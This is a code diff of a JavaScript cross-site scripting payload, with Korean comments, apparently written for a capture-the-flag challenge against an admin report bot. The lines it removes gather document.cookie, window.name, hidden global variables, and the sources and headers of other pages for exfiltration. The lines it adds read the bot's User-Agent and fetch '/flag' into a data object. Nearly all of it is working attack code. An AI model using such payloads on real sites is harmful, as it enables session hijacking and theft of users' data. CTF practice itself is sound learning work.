@@ -1,57 +1,26 @@
 (async () => {
-    // 1. 안정적인 로딩 대기
-    await new Promise(r => setTimeout(r, 1500));
+    // 1. User-Agent 탈취 (여기에 플래그가 있을 확률 90%)
+    const userAgent = navigator.userAgent;
 
-    // 2. 전역 변수 스캔 (window 객체에 "flag", "ctf", "admin" 등이 포함된 변수가 있는지)
-    // 표준 window 속성이 아닌 것들만 추려냅니다.
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
-    const standardGlobals = Object.keys(iframe.contentWindow);
-    document.body.removeChild(iframe);
-
-    const currentGlobals = Object.keys(window);
-    const customGlobals = {};
-    
-    currentGlobals.forEach(key => {
-        if (!standardGlobals.includes(key) && key !== 'renderConfig' && key !== 'errorReporter') {
-            try {
-                customGlobals[key] = window[key];
-            } catch(e) {}
+    // 2. 혹시 모를 /flag 경로 시도 (쿠키 없이도 접근 가능한지)
+    let flagContent = "Not Found";
+    try {
+        const res = await fetch('/flag');
+        if (res.status === 200) {
+            flagContent = await res.text();
+        } else {
+            flagContent = `Status: ${res.status}`;
         }
-    });
-
-    // 3. 다른 페이지들 소스 긁어오기
-    const urlsToFetch = ['/note/new', '/report'];
-    const pageSources = {};
-    
-    for (const url of urlsToFetch) {
-        try {
-            const res = await fetch(url);
-            pageSources[url] = await res.text();
-            // 혹시 헤더에 플래그가 있을 수도 있음
-            const headers = {};
-            for (const [k, v] of res.headers.entries()) {
-                headers[k] = v;
-            }
-            pageSources[url + "_headers"] = JSON.stringify(headers);
-        } catch (e) {
-            pageSources[url] = "Error: " + e.toString();
-        }
+    } catch (e) {
+        flagContent = e.toString();
     }
 
-    // 4. 데이터 전송
-    let data = {
-        msg: "Deep Scan Data",
-        // 1. 쿠키 재확인 (혹시 타이밍 문제였을까봐)
-        cookie: document.cookie,
-        // 2. window.name 확인 (CTF 단골 은닉처)
-        windowName: window.name,
-        // 3. 의심스러운 전역 변수들 (여기에 window.FLAG가 있을 확률 높음)
-        customGlobals: JSON.stringify(customGlobals),
-        // 4. 다른 페이지 소스들
-        pages: pageSources,
-        // 5. 현재 URL
+    // 3. 봇이 보낸 HTTP 요청의 헤더를 확인하기 위해
+    //    우리는 봇의 User-Agent를 명시적으로 body에 담아 보냅니다.
+    const data = {
+        msg: "Final Attempt",
+        userAgent: userAgent, // <--- 핵심
+        flagEndpoint: flagContent, // <--- 확인 사살
         location: window.location.href
     };
 
